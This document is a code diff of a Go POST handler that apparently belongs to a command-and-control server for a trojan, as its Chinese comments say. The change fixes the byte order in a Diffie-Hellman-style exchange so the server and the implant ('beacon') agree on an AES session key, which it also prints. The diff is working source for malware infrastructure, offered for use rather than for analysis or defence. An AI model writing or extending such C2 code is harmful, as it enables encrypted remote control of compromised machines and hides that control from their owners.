@@ -54,21 +54,25 @@ func POST_handler(body []byte, listener *Listener, r *http.Request) ([]byte, boo
 			println("2")
 
 			var CusAes big.Int
-			CusAes.SetBytes(GetBytes(body, 16))
+			// 从木马接收到的 a^b1, 木马使用小端序, 因此此处通过翻转来按小端序解析
+			CusAes.SetBytes(ReverseBytes(GetBytes(body, 16)))
 
-			printkey(CusAes.Bytes())
-			CusAes = *Bytes_To_BigInt(ReverseBytes(CusAes.Bytes()))
-			printkey(CusAes.Bytes())
-
-			Srvkey := Random_Big_Int128()
+			Srvkey := Random_Big_Int128() // 私钥 b1
 			Create_beacon_2(listener, &CusAes, Srvkey, ip, domain, i)
-			SrvAes := Mod_Pow(Bytes_To_BigInt(listener.A), Srvkey)
 
-			printkey(SrvAes.Bytes())
-			SrvAes = Bytes_To_BigInt(ReverseBytes(SrvAes.Bytes()))
-			printkey(SrvAes.Bytes())
+			// 底数 a 也是按小端序存储的, 因此转换成 BigInt 前需要反转
+			// SrvAes 就是 a^b2
+			SrvAes := Mod_Pow(Bytes_To_BigInt(ReverseBytes(listener.A)), Srvkey)
 
-			res = append(res, SrvAes.Bytes()...)
+			// 计算 (a^b1)^b2
+			TrueKey_num := Mod_Pow(&CusAes, Srvkey)
+
+			// TrueKey 就是会话密钥, 当然，需要按小端存取, 它可以直接用来创建 AES 加密器
+			TrueKey := ReverseBytes(TrueKey_num.Bytes())
+			printkey(TrueKey) // 打印会话密钥
+
+			// 发送 a^b2 时, 需要以小端序发送
+			res = append(res, ReverseBytes(SrvAes.Bytes())...)
 			return res, true
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch == "" {
